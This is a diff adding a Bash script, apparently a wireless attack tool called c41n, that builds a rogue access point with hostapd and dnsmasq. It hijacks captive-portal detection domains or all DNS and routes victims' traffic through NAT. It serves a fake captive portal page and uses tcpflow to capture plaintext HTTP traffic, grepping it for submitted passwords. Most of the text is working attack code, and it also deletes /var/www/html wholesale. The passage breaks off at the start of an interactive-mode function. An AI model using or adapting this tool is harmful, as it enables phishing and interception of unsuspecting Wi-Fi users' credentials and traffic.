@@ -1,0 +1,686 @@
+#!/bin/bash
+
+splash() {
+	clear
+	echo -e "${green}_________     _____ .___ ______"
+	echo -n -e "${light_yellow}"
+	echo -e '\_   ___ \   /  |  ||   |\      \'
+	echo -n -e "${yellow}"
+	echo -e '/    \  \/  /   |  ||   |/   |   \'
+	echo -n -e "${red}"
+	echo -e '\     \____/    ^   /   /    |    \'
+	echo -n -e "${magenta}"
+	echo -e ' \______  /\____   ||___\____|__  /'
+	echo -n -e "${cyan}"
+	echo -e '        \/      |__|            \/'
+	echo -e "${default}    by:    n1x_        ${red}[${default}MS-WEB${red}]${default}"
+}
+
+network_interface() {
+	sleep 0.5
+	echo -n -e "\n${default}[${blue}*${default}] Available ${blue}network interfaces${default}: \n\n"
+	sleep 1
+	ifconfig -a
+	echo -ne "[${green}+${default}] Enter ${green}network interface${default} to host the rogue access point on: "
+	read interface
+	echo -ne "[${green}+${default}] Enter ${green}network interface${default} with internet access, for traffic routing via masquerading: "
+	read interface2
+}
+
+monitor_mode() {
+	ifconfig $interface down
+	iwconfig $interface mode monitor
+	ifconfig $interface up
+	if [ $? -eq 0 ]; then
+   		echo -n -e "[${blue}*${default}] Monitor mode enabled on ${blue}${interface}${default}.\n"
+	else
+   		echo -n -e "[${red}!${default}] Operation failed. Quitting.\n"
+		exit 0
+	fi
+	sleep 0.5
+}
+
+ap_config_check() {
+	if [[ -f "config/hostapd.conf" ]]; then
+		echo -n -e "\n[${red}!${default}] ${red}hostapd configuration file${default} from previous instance detected.\n"
+		echo -n -e "[${yellow}*${default}] Removing '${yellow}hostapd.conf${default}'..."
+		rm config/hostapd.conf
+	fi
+
+        if [[ -f "config/dnsmasq.conf" ]]; then
+                echo -n -e "\n[${red}!${default}] ${red}dnsmasq configuration file${default} from previous instance detected.\n"
+                echo -n -e "[${yellow}*${default}] Removing '${yellow}dnsmasq.conf${default}'...\n"
+		rm config/dnsmasq.conf
+        fi
+}
+
+read_ap_config() {
+	echo -ne "\n[${green}+${default}] Enter the ${green}ESSID${default} of the rogue access point: "
+	read essid
+	echo -ne "[${green}+${default}] Enter the ${green}channel${default} of the rogue access point: "
+	read channel
+}
+
+captive_portal_detection() {
+	echo -ne "\n[${green}+${default}] Redirect ${green}all traffic${default} to captive portal? [y/N]: "
+	read redirect
+	case $redirect in
+		y|Y)
+			redirect_all=1
+			return
+			;;
+		n|N)
+			redirect_all=0
+			echo -n -e "\n[${blue}*${default}] Default captive portal ${blue}detection domains${default}:\n\n"
+			sleep 1
+			echo -n -e "[${blue}Windows${default}]\n"
+                        echo -n -e "www.msftconnecttest.com\n"
+                        echo -n -e "www.msftncsi.com\n"
+                        echo -n -e "www.msftncsi.com.edgesuite.net\n"
+                        echo -n -e "ipv6.msftncsi.com\n"
+                        echo -n -e "ipv6.msftncsi.com.edgesuite.net\n"
+                        echo -n -e "teredo.ipv6.microsoft.com\n"
+                        echo -n -e "teredo.ipv6.microsoft.com.nsatc.net\n\n"
+                        echo -n -e "[${blue}MacOS${default}/${blue}iOS${default}]\n"
+                        echo -n -e "www.appleiphonecell.com\n"
+                        echo -n -e "www.apple.com\n"
+                        echo -n -e "www.itools.info\n"
+                        echo -n -e "www.ibook.info\n"
+                        echo -n -e "www.airport.us\n"
+                        echo -n -e "www.appleiphonecell.com\n"
+                        echo -n -e "www.thinkdifferent.us\n"
+                        echo -n -e "apple.com\n"
+                        echo -n -e "captive.apple.com\n"
+                        echo -n -e "gsp1.apple.com\n"
+                        echo -n -e ".apple.com\n"
+                        echo -n -e ".apple.com.edgekey.net\n"
+                        echo -n -e ".akamaiedge.net\n"
+                        echo -n -e ".akamaitechnologies.com\n\n"
+                        echo -n -e "[${blue}Android${default}]\n"
+                        echo -n -e "clients3.google.com\n"
+                        echo -n -e "connectivitycheck.gstatic.com\n"
+                        echo -n -e "connectivitycheck.android.com\n"
+			sleep 0.5
+			echo -ne "\n\n[${green}+${default}] Add captive portal detection domains? [Y/n]: "
+			read add_captive_domain
+			case $add_captive_domain in
+				n|N)
+					return
+					;;
+				y|Y)
+					echo -n -e "[${blue}*${default}] Enter the domains one by one. Enter X when finished.\n"
+					while [ "$i" = "1" ]
+						do
+							echo -ne "[${green}+${default}] Enter the domain: "
+							read captive_domain
+							if [ "$captive_domain" = "X" ] || [ "$captive_domain" = "x" ]; then
+								echo -n -e "\n[${red}*${default}] Finished adding captive portal detection domains.\n"
+								i=0
+								return
+							fi
+							echo "address=/${captive_domain}/192.168.1.1" >> config/dnsmasq.conf
+						done
+					;;
+				*)
+					echo -n -e "[${red}!${default}] Error: ${red}Unexpected input${default}. Quitting...\n"
+					exit
+					;;
+			esac
+			;;
+		*)
+			echo -n -e "[${red}!${default}] Error: ${red}Unexpected input${default}. Quitting...\n"
+			exit
+			;;
+	esac
+}
+
+write_ap_config() {
+	echo -n -e "\n[${blue}*${default}] Writing the configuration files for ${blue}hostapd${default}(AP details) and ${blue}dnsmasq${default}(DHCP details) in '${blue}/tmp/hostapd.conf${default}' and '${blue}/tmp/dnsmasq.conf${default}'..."
+
+	echo "interface=$interface" >> config/hostapd.conf
+	echo "driver=nl80211" >> config/hostapd.conf
+	echo "ssid=$essid" >> config/hostapd.conf
+	echo "hw_mode=g" >> config/hostapd.conf
+	echo "channel=$channel" >> config/hostapd.conf
+	echo "macaddr_acl=0" >> config/hostapd.conf
+	echo "ignore_broadcast_ssid=0" >> config/hostapd.conf
+
+        echo "interface=$interface" >> config/dnsmasq.conf
+        echo "dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h" >> config/dnsmasq.conf
+        echo "dhcp-option=3, 192.168.1.1" >> config/dnsmasq.conf
+        echo "dhcp-option=6, 192.168.1.1" >> config/dnsmasq.conf
+        echo "server=8.8.8.8" >> config/dnsmasq.conf
+        echo "log-queries" >> config/dnsmasq.conf
+        echo "log-dhcp" >> config/dnsmasq.conf
+        echo "listen-address=127.0.0.1" >> config/dnsmasq.conf
+
+	if [ "$redirect_all" = "0" ]; then
+		echo "address=/www.msftconnecttest.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.msftncsi.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.msftncsi.com.edgesuite.net/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/ipv6.msftncsi.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/ipv6.msftncsi.com.edgesuite.net/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/teredo.ipv6.microsoft.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/teredo.ipv6.microsoft.com.nsatc.net/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/clients3.google.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/connectivitycheck.gstatic.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/connectivitycheck.android.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.appleiphonecell.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.apple.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.itools.info/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.ibook.info/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.airport.us/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.appleiphonecell.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.thinkdifferent.us/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/apple.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/captive.apple.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/gsp1.apple.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/.apple.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/.apple.com.edgekey.net/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/.akamaiedge.net/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/.akamaitechnologies.com/192.168.1.1" >> config/dnsmasq.conf
+	elif [ "$redirect_all" = "1" ]; then
+		echo "address=/#/192.168.1.1" >> config/dnsmasq.conf
+	fi
+	sleep 0.5
+}
+
+ap_route() {
+	echo -n -e "\n[${blue}*${default}] Assigning ${blue}default gateway adress${default} and ${blue}netmask${default} to rogue access point...\n"
+	ifconfig $interface up 192.168.1.1 netmask 255.255.255.0
+	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+	sleep 0.5
+}
+
+masquerade() {
+	echo -n -e "[${blue}*${default}] Setting up traffic routing via ${blue}masquerading${default}...\n"
+	iptables --table nat --append POSTROUTING --out-interface $interface2 -j MASQUERADE
+	iptables --append FORWARD --in-interface $interface -j ACCEPT
+	sleep 0.5
+}
+
+forwarding() {
+	echo -n -e "[${blue}*${default}] Enabling ${blue}IPv4 forwarding${default}...\n"
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+	sleep 0.5
+}
+
+clear_root_apache_dir() {
+	echo -n -e "\n[${red}!${default}] Warning: If continued, c41n will ${red}remove${default} all content inside '${red}/var/www/html${default}'!\n"
+	echo -n -e "[${red}!${default}] It is recommended to ${red}backup${default} the data.\n"
+	sleep 0.5
+	echo -ne "\n[${green}+${default}] Press ${green}Enter${default} to continue... "
+	read
+	rm -rf /var/www/html/*
+}
+
+captive_portal() {
+	echo -n -e "\n[${blue}*${default}] Copying ${blue}captive${defaul} portal directory to '${blue}/var/www/html${default}'.."
+	cd captive_portal
+	cp bg.jpg bootstrap.min.css bootstrap.min.js connect.php index.html jquery.min.js style.css upgrading.html /var/www/html
+	cd ../
+	sleep 0.5
+}
+
+mod_rewrite() {
+	echo  -n -e "\n[${blue}*${default}] Configuring ${blue}mod_rewrite${default} rules for rewriting requested URLs...\n"
+	mv /etc/apache2/sites-enabled/000-default.conf /etc/apache2/sites-enabled/.000-default.conf
+	echo '<VirtualHost *:80>' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        ServerAdmin webmaster@localhost' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        DocumentRoot /var/www/html' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        ErrorLog ${APACHE_LOG_DIR}/error.log' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        CustomLog ${APACHE_LOG_DIR}/access.log combined' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '</VirtualHost>' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '<Directory "/var/www/html">' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        RewriteEngine On' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        RewriteBase /' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        RewriteRule ^(.*)$ http://%1/$1 [R=301,L]' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        RewriteCond %{REQUEST_FILENAME} !-f' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        RewriteCond %{REQUEST_FILENAME} !-d' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        RewriteRule ^(.*)$ / [L,QSA]' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '</Directory>' >> /etc/apache2/sites-enabled/000-default.conf
+	sleep 0.5
+	echo -n -e "[${blue}*${default}] Enabling mod_rewrite...\n"
+	a2enmod rewrite &> /dev/null
+	sleep 0.5
+}
+
+apache_restart() {
+	echo -n -e "[${blue}*${default}] Restarting ${blue}Apache${default} server...\n"
+	service apache2 restart
+	sleep 0.5
+}
+
+ap_start() {
+	echo -n -e "[${blue}*${default}] Starting ${blue}Rogue AP${default}..."
+	sleep 0.5
+	xterm -e 'dnsmasq -C config/dnsmasq.conf -d' & xterm -e 'hostapd config/hostapd.conf'
+	wait
+}
+
+ap_start_cp() {
+        echo -n -e "[${blue}*${default}] Starting ${blue}rogue AP${default} with ${blue}captive portal${default}...\n"
+	sleep 0.5
+        xterm -e 'dnsmasq -C config/dnsmasq.conf -d' & xterm -e 'hostapd config/hostapd.conf' & xterm -e "tcpflow -i any -C -g port 80 | grep -i 'password1='"
+	wait
+        echo -n -e "\n[${blue}*${default}] Operation finished.\n"
+}
+
+ap_start_sniff() {
+	echo -n -e "[${blue}*${default}] Starting ${blue}rogue AP${default} and ${blue}traffic sniffing${default}...\n"
+	sleep 0.5
+	xterm -e 'dnsmasq -C config/dnsmasq.conf -d' & xterm -e 'hostapd config/hostapd.conf' & xterm -e 'tcpflow -i any -C -g port 80 | tee capture.txt'
+	wait
+	echo -n -e "\n[${blue}*${default}] Operation finished.\n"
+}
+
+restore_apache() {
+	echo -n -e "\n[${yellow}*${default}] Restoring previous ${yellow}Apache2 configuration${default}..."
+	rm /etc/apache2/sites-enabled/000-default.conf
+        mv /etc/apache2/sites-enabled/.000-default.conf /etc/apache2/sites-enabled/000-default.conf
+        echo -n -e "\n[${blue}*${default}] Operation finished.\n"
+}
+
+restore_managed_mode() {
+	echo -n -e "\n[${yellow}*${default}] Restoring $interface to ${yellow}managed${default} mode...\n\n"
+	ifconfig $interface down
+	iwconfig $interface mode managed
+	ifconfig $interface up
+}
+
+ap_quick() {
+	splash
+	echo -e "\n"
+	ifconfig $1 down
+	iwconfig $1 mode monitor
+	ifconfig $1 up
+   	echo -n -e "[${blue}*${default}] Monitor mode enabled on ${blue}${1}${default}.\n"
+	if [[ -f "config/hostapd.conf" ]]; then
+		echo -n -e "\n[${red}!${default}] ${red}hostapd configuration file${default} from previous instance detected.\n"
+		echo -n -e "[${yellow}*${default}] Removing '${yellow}hostapd.conf${default}'..."
+		rm config/hostapd.conf
+	fi
+
+        if [[ -f "config/dnsmasq.conf" ]]; then
+                echo -n -e "\n[${red}!${default}] ${red}dnsmasq configuration file${default} from previous instance detected.\n"
+                echo -n -e "[${yellow}*${default}] Removing '${yellow}dnsmasq.conf${default}'...\n"
+		rm config/dnsmasq.conf
+        fi
+
+	echo -n -e "\n[${blue}*${default}] Writing the configuration files for ${blue}hostapd${default}(AP details) and ${blue}dnsmasq${default}(DHCP details) in '${blue}/tmp/hostapd.conf${default}' and '${blue}/tmp/dnsmasq.conf${default}'..."
+
+	echo "interface=$1" >> config/hostapd.conf
+	echo "driver=nl80211" >> config/hostapd.conf
+	echo "ssid=$3" >> config/hostapd.conf
+	echo "hw_mode=g" >> config/hostapd.conf
+	echo "channel=$4" >> config/hostapd.conf
+	echo "macaddr_acl=0" >> config/hostapd.conf
+	echo "ignore_broadcast_ssid=0" >> config/hostapd.conf
+
+        echo "interface=$1" >> config/dnsmasq.conf
+        echo "dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h" >> config/dnsmasq.conf
+        echo "dhcp-option=3, 192.168.1.1" >> config/dnsmasq.conf
+        echo "dhcp-option=6, 192.168.1.1" >> config/dnsmasq.conf
+        echo "server=8.8.8.8" >> config/dnsmasq.conf
+        echo "log-queries" >> config/dnsmasq.conf
+        echo "log-dhcp" >> config/dnsmasq.conf
+        echo "listen-address=127.0.0.1" >> config/dnsmasq.conf
+
+	echo -n -e "\n[${blue}*${default}] Assigning ${blue}default gateway adress${default} and ${blue}netmask${default} to rogue access point...\n"
+	ifconfig $1 up 192.168.1.1 netmask 255.255.255.0
+	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+
+	echo -n -e "[${blue}*${default}] Setting up traffic routing via ${blue}masquerading${default}...\n"
+	iptables --table nat --append POSTROUTING --out-interface $2 -j MASQUERADE
+	iptables --append FORWARD --in-interface $1 -j ACCEPT
+
+	echo -n -e "[${blue}*${default}] Enabling ${blue}IPv4 forwarding${default}...\n"
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+
+	echo -n -e "[${blue}*${default}] Starting ${blue}Rogue AP${default}..."
+	xterm -e 'dnsmasq -C config/dnsmasq.conf -d' & xterm -e 'hostapd config/hostapd.conf'
+	wait
+        echo -n -e "\n[${blue}*${default}] Operation finished.\n"
+
+	echo -n -e "\n[${yellow}*${default}] Restoring $1 to ${yellow}managed${default} mode...\n\n"
+	ifconfig $1 down
+	iwconfig $1 mode managed
+	ifconfig $1 up
+}
+
+sniff_quick() {
+        splash
+        echo -e "\n"
+        ifconfig $1 down
+        iwconfig $1 mode monitor
+        ifconfig $1 up
+        echo -n -e "[${blue}*${default}] Monitor mode enabled on ${blue}${1}${default}.\n"
+        if [[ -f "config/hostapd.conf" ]]; then
+                echo -n -e "\n[${red}!${default}] ${red}hostapd configuration file${default} from previous instance detected.\n"
+                echo -n -e "[${yellow}*${default}] Removing '${yellow}hostapd.conf${default}'..."
+                rm config/hostapd.conf
+        fi
+
+        if [[ -f "config/dnsmasq.conf" ]]; then
+                echo -n -e "\n[${red}!${default}] ${red}dnsmasq configuration file${default} from previous instance detected.\n"
+                echo -n -e "[${yellow}*${default}] Removing '${yellow}dnsmasq.conf${default}'...\n"
+                rm config/dnsmasq.conf
+        fi
+
+        echo -n -e "\n[${blue}*${default}] Writing the configuration files for ${blue}hostapd${default}(AP details) and ${blue}dnsmasq${default}(DHCP details) in '${blue}/tmp/hostapd.conf${default}' and '${blue}/tmp/dnsmasq.conf${default}'..."
+
+        echo "interface=$1" >> config/hostapd.conf
+        echo "driver=nl80211" >> config/hostapd.conf
+        echo "ssid=$3" >> config/hostapd.conf
+        echo "hw_mode=g" >> config/hostapd.conf
+        echo "channel=$4" >> config/hostapd.conf
+        echo "macaddr_acl=0" >> config/hostapd.conf
+        echo "ignore_broadcast_ssid=0" >> config/hostapd.conf
+
+        echo "interface=$1" >> config/dnsmasq.conf
+        echo "dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h" >> config/dnsmasq.conf
+        echo "dhcp-option=3, 192.168.1.1" >> config/dnsmasq.conf
+        echo "dhcp-option=6, 192.168.1.1" >> config/dnsmasq.conf
+        echo "server=8.8.8.8" >> config/dnsmasq.conf
+        echo "log-queries" >> config/dnsmasq.conf
+        echo "log-dhcp" >> config/dnsmasq.conf
+        echo "listen-address=127.0.0.1" >> config/dnsmasq.conf
+
+        echo -n -e "\n[${blue}*${default}] Assigning ${blue}default gateway adress${default} and ${blue}netmask${default} to rogue access point...\n"
+        ifconfig $1 up 192.168.1.1 netmask 255.255.255.0
+        route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+
+        echo -n -e "[${blue}*${default}] Setting up traffic routing via ${blue}masquerading${default}...\n"
+        iptables --table nat --append POSTROUTING --out-interface $2 -j MASQUERADE
+        iptables --append FORWARD --in-interface $1 -j ACCEPT
+
+        echo -n -e "[${blue}*${default}] Enabling ${blue}IPv4 forwarding${default}...\n"
+        echo 1 > /proc/sys/net/ipv4/ip_forward
+
+        echo -n -e "[${blue}*${default}] Starting ${blue}rogue AP${default} and ${blue}traffic sniffing${default}...\n"
+        xterm -e 'dnsmasq -C config/dnsmasq.conf -d' & xterm -e 'hostapd config/hostapd.conf' & xterm -e 'tcpflow -i any -C -g port 80 | tee capture.txt'
+        wait
+        echo -n -e "\n[${blue}*${default}] Operation finished.\n"
+
+        echo -n -e "\n[${yellow}*${default}] Restoring $1 to ${yellow}managed${default} mode...\n\n"
+        ifconfig $1 down
+        iwconfig $1 mode managed
+        ifconfig $1 up
+}
+
+captive_quick() {
+        splash
+        echo -e "\n"
+        ifconfig $1 down
+        iwconfig $1 mode monitor
+        ifconfig $1 up
+        echo -n -e "[${blue}*${default}] Monitor mode enabled on ${blue}${1}${default}.\n"
+        if [[ -f "config/hostapd.conf" ]]; then
+                echo -n -e "\n[${red}!${default}] ${red}hostapd configuration file${default} from previous instance detected.\n"
+                echo -n -e "[${yellow}*${default}] Removing '${yellow}hostapd.conf${default}'..."
+                rm config/hostapd.conf
+        fi
+
+        if [[ -f "config/dnsmasq.conf" ]]; then
+                echo -n -e "\n[${red}!${default}] ${red}dnsmasq configuration file${default} from previous instance detected.\n"
+                echo -n -e "[${yellow}*${default}] Removing '${yellow}dnsmasq.conf${default}'...\n"
+                rm config/dnsmasq.conf
+        fi
+
+	echo -n -e "\n[${blue}*${default}] Writing the configuration files for ${blue}hostapd${default}(AP details) and ${blue}dnsmasq${default}(DHCP details) in '${blue}/tmp/hostapd.conf${default}' and '${blue}/tmp/dnsmasq.conf${default}'..."
+
+	echo "interface=$1" >> config/hostapd.conf
+	echo "driver=nl80211" >> config/hostapd.conf
+	echo "ssid=$3" >> config/hostapd.conf
+	echo "hw_mode=g" >> config/hostapd.conf
+	echo "channel=$4" >> config/hostapd.conf
+	echo "macaddr_acl=0" >> config/hostapd.conf
+	echo "ignore_broadcast_ssid=0" >> config/hostapd.conf
+
+        echo "interface=$1" >> config/dnsmasq.conf
+        echo "dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h" >> config/dnsmasq.conf
+        echo "dhcp-option=3, 192.168.1.1" >> config/dnsmasq.conf
+        echo "dhcp-option=6, 192.168.1.1" >> config/dnsmasq.conf
+        echo "server=8.8.8.8" >> config/dnsmasq.conf
+        echo "log-queries" >> config/dnsmasq.conf
+        echo "log-dhcp" >> config/dnsmasq.conf
+        echo "listen-address=127.0.0.1" >> config/dnsmasq.conf
+	if [ "$5" = "1" ]; then
+		echo "address=/#/192.168.1.1" >> config/dnsmasq.conf
+	elif [ "$5" = "0" ]; then
+		echo "address=/www.msftconnecttest.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.msftncsi.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.msftncsi.com.edgesuite.net/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/ipv6.msftncsi.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/ipv6.msftncsi.com.edgesuite.net/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/teredo.ipv6.microsoft.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/teredo.ipv6.microsoft.com.nsatc.net/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/clients3.google.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/connectivitycheck.gstatic.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/connectivitycheck.android.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.appleiphonecell.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.apple.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.itools.info/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.ibook.info/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.airport.us/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.appleiphonecell.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/www.thinkdifferent.us/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/apple.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/captive.apple.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/gsp1.apple.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/.apple.com/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/.apple.com.edgekey.net/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/.akamaiedge.net/192.168.1.1" >> config/dnsmasq.conf
+		echo "address=/.akamaitechnologies.com/192.168.1.1" >> config/dnsmasq.conf
+	elif [[ -f $5 ]]; then
+		echo "address=/www.msftconnecttest.com/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/www.msftncsi.com/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/www.msftncsi.com.edgesuite.net/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/ipv6.msftncsi.com/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/ipv6.msftncsi.com.edgesuite.net/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/teredo.ipv6.microsoft.com/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/teredo.ipv6.microsoft.com.nsatc.net/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/clients3.google.com/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/connectivitycheck.gstatic.com/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/connectivitycheck.android.com/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/www.appleiphonecell.com/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/www.apple.com/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/www.itools.info/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/www.ibook.info/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/www.airport.us/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/www.appleiphonecell.com/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/www.thinkdifferent.us/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/apple.com/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/captive.apple.com/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/gsp1.apple.com/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/.apple.com/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/.apple.com.edgekey.net/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/.akamaiedge.net/192.168.1.1" >> config/dnsmasq.conf
+                echo "address=/.akamaitechnologies.com/192.168.1.1" >> config/dnsmasq.conf
+
+		while IFS= read -r line; do
+                echo "address=/$line/192.168.1.1" >> config/dnsmasq.conf
+		done < "$5"
+	fi
+
+	echo -n -e "\n[${blue}*${default}] Assigning ${blue}default gateway adress${default} and ${blue}netmask${default} to rogue access point...\n"
+	ifconfig $1 up 192.168.1.1 netmask 255.255.255.0
+	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+
+	echo -n -e "[${blue}*${default}] Setting up traffic routing via ${blue}masquerading${default}...\n"
+	iptables --table nat --append POSTROUTING --out-interface $2 -j MASQUERADE
+	iptables --append FORWARD --in-interface $1 -j ACCEPT
+
+	echo -n -e "[${blue}*${default}] Enabling ${blue}IPv4 forwarding${default}...\n"
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+
+	rm -rf /var/www/html/*
+
+	echo -n -e "\n[${blue}*${default}] Copying ${blue}captive${defaul} portal directory to '${blue}/var/www/html${default}'.."
+	cd captive_portal
+	cp bg.jpg bootstrap.min.css bootstrap.min.js connect.php index.html jquery.min.js style.css upgrading.html /var/www/html
+	cd ../
+
+	echo  -n -e "\n[${blue}*${default}] Configuring ${blue}mod_rewrite${default} rules for rewriting requested URLs...\n"
+	mv /etc/apache2/sites-enabled/000-default.conf /etc/apache2/sites-enabled/.000-default.conf
+	echo '<VirtualHost *:80>' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        ServerAdmin webmaster@localhost' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        DocumentRoot /var/www/html' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        ErrorLog ${APACHE_LOG_DIR}/error.log' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        CustomLog ${APACHE_LOG_DIR}/access.log combined' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '</VirtualHost>' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '<Directory "/var/www/html">' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        RewriteEngine On' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        RewriteBase /' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        RewriteRule ^(.*)$ http://%1/$1 [R=301,L]' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        RewriteCond %{REQUEST_FILENAME} !-f' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        RewriteCond %{REQUEST_FILENAME} !-d' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '        RewriteRule ^(.*)$ / [L,QSA]' >> /etc/apache2/sites-enabled/000-default.conf
+	echo '</Directory>' >> /etc/apache2/sites-enabled/000-default.conf
+	echo -n -e "[${blue}*${default}] Enabling mod_rewrite...\n"
+	a2enmod rewrite &> /dev/null
+
+	echo -n -e "[${blue}*${default}] Restarting ${blue}Apache${default} server...\n"
+	service apache2 restart
+
+        echo -n -e "[${blue}*${default}] Starting ${blue}rogue AP${default} with ${blue}captive portal${default}...\n"
+        xterm -e 'dnsmasq -C config/dnsmasq.conf -d' & xterm -e 'hostapd config/hostapd.conf' & xterm -e "tcpflow -i any -C -g port 80 | grep -i 'password1='"
+	wait
+        echo -n -e "\n[${blue}*${default}] Operation finished.\n"
+
+	echo -n -e "\n[${yellow}*${default}] Restoring previous ${yellow}Apache2 configuration${default}..."
+	rm /etc/apache2/sites-enabled/000-default.conf
+        mv /etc/apache2/sites-enabled/.000-default.conf /etc/apache2/sites-enabled/000-default.conf
+        echo -n -e "\n[${blue}*${default}] Operation finished.\n"
+
+	echo -n -e "\n[${yellow}*${default}] Restoring $1 to ${yellow}managed${default} mode...\n\n"
+	ifconfig $1 down
+	iwconfig $1 mode managed
+	ifconfig $1 up
+}
+
+rogue() {
+	network_interface
+	monitor_mode
+	ap_config_check
+	read_ap_config
+	write_ap_config
+	ap_route
+	masquerade
+	forwarding
+	ap_start
+	restore_managed_mode
+}
+
+sniff() {
+        network_interface
+        monitor_mode
+        ap_config_check
+        read_ap_config
+        write_ap_config
+        ap_route
+        masquerade
+        forwarding
+        ap_start_sniff
+	restore_managed_mode
+}
+
+captive() {
+	network_interface
+	monitor_mode
+	ap_config_check
+	read_ap_config
+	captive_portal_detection
+	write_ap_config
+	ap_route
+        masquerade
+        forwarding
+	clear_root_apache_dir
+	captive_portal
+	mod_rewrite
+	apache_restart
+	ap_start_cp
+	restore_apache
+	restore_managed_mode
+}
+
+
+interactive_mode() {
+	splash
